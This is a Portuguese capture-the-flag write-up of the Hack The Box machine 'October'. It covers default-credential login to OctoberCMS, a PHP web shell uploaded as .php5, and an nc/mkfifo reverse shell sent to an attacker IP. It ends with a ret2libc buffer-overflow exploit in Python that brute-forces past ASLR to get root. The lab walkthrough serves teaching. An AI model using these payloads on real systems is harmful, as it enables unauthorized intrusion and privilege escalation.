---
title: "Hack The Box - October"
tags: [Linux,Medium,Buffer Overflow Linux]
categories: HackTheBox
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/15>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 22 - Servidor SSH

> Porta 80 - Servidore Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_web.png)

## Gobuster na aplicação

Sempre que verificamos servidor web ativo, é de costume rodar um wfuzz ou gobuster de leve na aplicação, pra ver mais diretórios que possam estar "escondidos"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_wfuzz.png)

Explicação parâmetros wfuzz

gobuster dir -u http://10.10.10.16 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

> dir --> modo discovery

> -w  --> aqui se diz qual vai ser a wordlist utilizada

> -u http://10.10.10.16/--> site que será realizado o fuzzing

# Exploração OctoberCMS

Bom, já que sabemos que a aplicação web que está rodando é o OctoberCMS, vamos começar a pesquisar como podemos explorar ela

A primeira coisa a se pesquisar deve ser no `searchsploit`, ele é um banco de dados bem bacana, que tem uma grande quantidade de exploits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_searchsploit.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_searchsploit1.png)

> https://www.exploit-db.com/exploits/41936

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_searchsploit2.png)

Verificando as pastas que o wfuzz encontrou, temos a /backend que é a página de login do administrador do sistema

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back.png)

## Logando na aplicação

Quase todos os exploits que nos interessam dessa aplicação deve ser realizado de maneira autenticada, o que complica um pouco

Bom, sempre que vemos página de login, devemos procurar por credenciais padrão da aplicação, esta não é diferente, no google já temos a resposta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back2.png)

admin:admin

Vamos logar então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back4.png)

## Realizando a exploração da aplicação

Bom, a vulnerabilidade dessa aplicação consiste em ele realizar um black list de possíveis extensões maliciosas

https://www.exploit-db.com/exploits/41936

```
106 <?php
107 protected function blockedExtensions()
108 {
109         return [
110                 // redacted
111                 'php',
112                 'php3',
113                 'php4',
114                 'phtml',
115                 // redacted
116         ];
117 }
```

Sim, show de bola isso, só que ele esqueceu de colocar a php5, que é php válido... então se uparmos um arquivo com extensão php5 temos acesso ao servidor

Vamos lá

Clique em `media`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back5.png)

Realizamos upload de um shell php

```
<?php system($_REQUEST['cmd']); ?>
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back6.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_back7.png)

Ali no lado em `Click Here` sinaliza o local onde foi colocado o arquivo

> http://10.10.10.16/storage/app/media/cmd.php5

Então, vamos testar e pegar uma reverse shell

## Teste RCE e Reverse Shell

Sim! Temos RCE!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_rce.png)

Agora, pegamos uma reverse shell

```
http://10.10.10.16/storage/app/media/cmd.php5?cmd=rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/sh%20-i%202%3E%261|nc%2010.10.16.92%20443%20%3E/tmp/f
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_rev.png)

# Escalação de Privilégio

Como de costume, rodamos um script para escalação de privilégio

No caso, rodaremos o LinPeas (pq eu gosto das cores, mas tanto faz qual vc vai utilizar)

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_lin.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_lin1.png)

Executamos na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_lin2.png)

Encontramos algo interessante em `/usr/local/bin/ovrflw`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_lin3.png)

Verificamos do que se trata esse `ovrflw`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_lin4.png)

Passamos esse ovrflw para a máquina Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_ovrflw.png)

## Buffer Overflow

Bom, ta na cara que vamos ter que fazer um Buffer Overflow nessa aplicação. Buffer Overflow de linux sempre foi muito difícil pra mim, então novamente, vou tentar ser o mais explicativo e demonstrativo o possível, pra você que está lendo possa entender da melhor maneira possível! Esse exercício se assemelhou ao Frolic - HTB. A grande diferença aqui vai ser o fato de ASLR estar habilitado nessa máquina, o que da um grau de dificuldade um pouco maior

Primeira coisa a fazer é confirmar se tem ASLR habilitado, isso nós verificamos na máquina invadida

```
cat /proc/sys/kernel/randomize_va_space
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_a.png)

Sim, 2 quer dizer habilitado, mas o que isso quer dizer?

Quer dizer que a `libc` vai ser carregada me pontos diferentes da memória toda vez que for executada (diferentemente da máquina Frolic), dificultando da gente 'acertar' os valores

```
ldd /usr/local/bin/ovrflw | grep libc
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_a2.png)

Segunda coisa que devemos fazer é executar ele, sim, pra ver como ele se comporta na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_s.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_s1.png)

Verificamos que devemos passar uma string pra ele, possivelmente uma string grande irá dar Segmentation Fault no binário, vamos verificar se ele tem alguma chamada que é vulnerável a Buffer Overflow

```
strings ovrflw | grep strcpy
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_s2.png)

Bom, ele possui a função strcpy, outro indicativo que é vulnerável a Buffer Overflow

Vamos checar as proteções que ele tem habilitadas

```
checksec ovrflw
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_c.png)

### Explicando o que é NX Enabled

NX: Enabled... o que quer dizer? 

Encontrei um blog bem bacana que explica isso

> https://medium.com/caio-noobs-around/bypassando-nx-e-canary-em-x86-b8d8855f1352

```
Essa proteção determina quais áreas da memória poderão ser executadas. Impedindo assim, que o atacante coloque seu payload malicioso na Stack e o execute com alguma vulnerabilidade. Existem inúmeras maneiras de evitar essa proteção, neste exploit eu usei o ret2libc. 

A idéia principal do ret2libc é que ao invés de redirecionarmos a execução do programa para o nosso payload na stack, vamos executar algo da libc como um system("/bin/sh") por exemplo. Para fazermos isso precisamos passar argumentos para a função. No x86 os argumentos ficam na stack, então temos que prepará-la de acordo com o que quisermos fazer. No caso nossa stack terá que se parecer com essa:
```

![](https://miro.medium.com/max/180/1*LjEI-MYRVHuZ8UHdYKsVFQ.png)

Hummmmm, saquei... ou não... bom vamos prosseguir, vai ficar mais claro conforme a gente for montando o exploit pra parada

### Explicando o que é ASLR Enabled

Bom, antes de prosseguir é bom também explicar mais a fundo o que é esse tal de ASLR Enabled e o que isso vai influenciar no nosso exploit. Sei que falei disso antes ali em cima, mas é bom reforçar, até pra eu entender essa bagaça melhor

Se verificarmos quando eu explique em cima, a libc fica sendo carregada em locais diferentes a cada momento que verificamos, até ai tudo ok. Mas se olharmos bem, não é tãooo aleatório assim.... O endereço está trocando entre 0xb7500000 e 0xb76ff000, então da pra tentar adivinhar mais ou menos onde vai estar... sim, brute force... Vou verificar quais são os bits que estão alterando e fazer brute force neles, uma hora vou acertar

### Inicando montagem do exploit (na mão)

Aqui vou explicar primeiro sem ser direto, sim ir direto facilita e muito a criação do exploit, mas é imporante entender o que está acontecendo, ou seja, fazer no braço antes de utilizar esse tipo de ferramenta

Vamos lá, abrimos a aplicação no gdb (eu uso o gef)

```
gdb -q ./ovrflw
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_g.png)

Bom, com ele aberto, devemos verificar exatamente com quantos bytes enviados pra aplicação ela vai crashar

#### Descoberta do offset

Para isso utilizamos o `pattern create` vamos criar um pattern de 200 bytes

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_g1.png)

Agora enviamos ele para a aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_g2.png)

Se verificarmos no $EIP ele tem um endereço "estranho" ali, (daab), e verificamos lá em baixo a mensagem de erro SIGSEGV, ou seja ocorreu o buffer overflow

Agora com o pattern 'daab' vamos descobrir o ponto exato que ocorreu o crash

Hummm... com o `pattern offset` descobrimos isso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_g3.png)

Sim! Descoberto, com 112 causamos o crash, vamos confirmar isso?

Começamos a montar o script pra ver o buffer acontecer

#### Confirmação do pattern

exploit.py
```
import struct
buf = "A" * 112
buf += struct.pack("<I",0x42424242)
print buf
```

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_g4.png)

Enviamos para a aplicação

r `python exploit.py`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_g5.png)

Shooow! É isso mesmo, com 112 ocasionamos o crash, 116 sobrescrevemos todo o EIP

Bom, a partir de agora precisamos de dados da máquina, não posso pegar da minha pq meu sistema eh 64 bits, a máquina invadida é 32 bits

#### Montagem do exploit

Montamos o exploit com essa base:

```
system_addr = endereço do system
exit_addr = qlqr coisa, é pra onde ele vai depois de executar o /bin/sh
arg_addr = é o comando do /bin/sh  
```

Beleza, é isso, mas onde vamos pegar todos esses valore pra colocar ali?

exploit.py
```
import struct


system_addr = struct.pack("<I",)
exit_addr = struct.pack("<I",)
arg_addr = struct.pack("<I",)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr
```

#### Verificação da base da libc a ser carregada

Devemos verificar qual vai ser a base da libc que deve ser carregada no exploit, tendo em vista realizar o brute force

Aqui tanto faz qual deles vai ser, tem que ser um válido pra ele ter como base pra realização do brute force


`ldd /usr/local/bin/ovrflw | grep libc`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_libc.png)

Acrescentamos no exploit

exploit.py
```
import struct

libc_base_addr = 0xb759e000

system_addr = struct.pack("<I",)
exit_addr = struct.pack("<I",)
arg_addr = struct.pack("<I",)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr
```

#### Verificação system libc

Verificamos a posição do system na libc dessa máquina

`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_system.png)

Adicionamos no exploit

exploit.py
```
import struct

libc_base_addr = 0xb759e000
system_off = 0x00040310


system_addr = struct.pack("<I",)
exit_addr = struct.pack("<I",)
arg_addr = struct.pack("<I",)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr
```

#### Procuramos o endereço na libc dessa máquina equivalente a /bin/sh

O comando é:

`strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_binsh.png)

Adicionamos ao exploit

exploit.py
```
import struct

libc_base_addr = 0xb759e000
system_off = 0x00040310
arg_sh = 0x00162bac
exit_add = 0x42424242

system_addr = struct.pack("<I",)
exit_addr = struct.pack("<I",)
arg_addr = struct.pack("<I",)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr
```

O endereço de `exit_add` pode ser qualquer coisa, tendo em vista depois da execução do `/bin/sh` tanto faz o que a aplicação faz

#### Finalização do exploit

O exploit está quase pronto, vamos ajustar ele agora

exploit.py
```
import struct

libc_base_addr = 0xb759e000
system_off = 0x00040310
arg_sh = 0x00162bac
exit_add = 0x42424242

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_add)
arg_addr = struct.pack("<I",libc_base_addr+arg_sh)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr
```

O que foi feito? Nós colocamos os endereços que system, binsh e exit, somados ao da base da libc, pq eles são carregados na libc... ficou confuso? Bom, acho que é isso

#### Montagem do loop

Agora, tendo em vista a ASLR estar ativada devemos realizar a montagem do exploit para relizar esse loop

exploit.py
```
import struct
from subprocess import call

libc_base_addr = 0xb759e000
system_off = 0x00040310
arg_sh = 0x00162bac
exit_add = 0x42424242

system_addr = struct.pack("<I",libc_base_addr+system_off)
exit_addr = struct.pack("<I",libc_base_addr+exit_add)
arg_addr = struct.pack("<I",libc_base_addr+arg_sh)

buf = "A" * 112
buf += system_addr
buf += exit_addr
buf += arg_addr

i = 0
while (i < 512):
    print "Tentativa: %s" %i
    i += 1
    ret = call(["/usr/local/bin/ovrflw",buf])
```

### Ganhando acesso ao sistema

Agora executamos o exploit e esperamos ser feito o Brute Force, uma hora ele vai acertar e nos dar uma shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_roota0.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_roota.png)

Bom uma vez que já sabemos como funciona a estrutura do exploit, podemos demonstrar agora como ir direto ao ponto e assim ganhar acesso de root

### Iniciando montagem do exploit (processo direto)

Bom, aqui vou direto ao ponto, o que será feito é conhecido como `ret2libc`, ou return to libc

Primeiro achar o endereço da libc (sim essa merda denovo... vamo lá, não custa praticar)

`ldd /usr/local/bin/ovrflw | grep libc`

> 0xb75b2000

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_ret.png)

Segundo pegar os endereços para system, exit e bin/sh

`readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"`

> 00033260 - exit

> 00040310 - system

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_ret1.png)

`strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"`

> 162bac

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_ret2.png)

Agora vamos montar o exploit

Somamos os valores obtidos com a base da libc (isso foi feito antes também, mas quem realizou essa soma foi o próprio exploit)

```
exit: 0xb75b2000+0x33260 = 0xB75E5260
system: 0xb75b2000+0x40310 = 0xB75F2310
/bin/sh: = 0xb75b2000+0x162bac = 0xB7714BAC‬
```

O overflow vai ser, LIXO + system + exit + /bin/sh

Do mesmo modo que foi antes

#### É hora do show!

Se a porcaria do ASLR estivesse desabilitado, era só rodar esse comando que eu ia ganhar root

Uéé! Por que está invertido? É pq é little indian!

`/usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x23\x5f\xb7" + "\x60\x52\x5e\xb7" + "\xac\x4b\x71\xb7"');`

Mas como está habilitado, tenho que fazer o loop

`while true; do /usr/local/bin/ovrflw $(python -c 'print "\x90"*112 + "\x10\x23\x5f\xb7" + "\x60\x52\x5e\xb7" + "\xac\x4b\x71\xb7"'); done`

Executamos!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_show.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_show1.png)

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-october/O_user.png)